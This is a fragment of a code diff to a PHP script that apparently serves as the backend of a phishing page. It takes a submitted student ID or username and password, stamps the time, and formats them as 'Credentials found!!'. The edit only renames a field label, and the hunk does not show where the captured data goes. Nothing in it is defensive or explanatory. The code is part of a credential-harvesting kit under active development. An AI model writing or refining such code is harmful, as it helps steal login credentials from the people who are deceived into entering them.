@@ -8,7 +8,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $currentTime = date('Y-m-d H:i:s');
 
     // Format the data
-    $data = "\nCredentials found!! :\n\nStudent ID: $stuid\n\nPassword: $password\n\nTime: $currentTime\n\n- - - - - - - - - - - - - - - - - - - - - - - -\n\n";
+    $data = "\nCredentials found!! :\n\nUsername: $stuid\n\nPassword: $password\n\nTime: $currentTime\n\n- - - - - - - - - - - - - - - - - - - - - - - -\n\n";
     
     
 
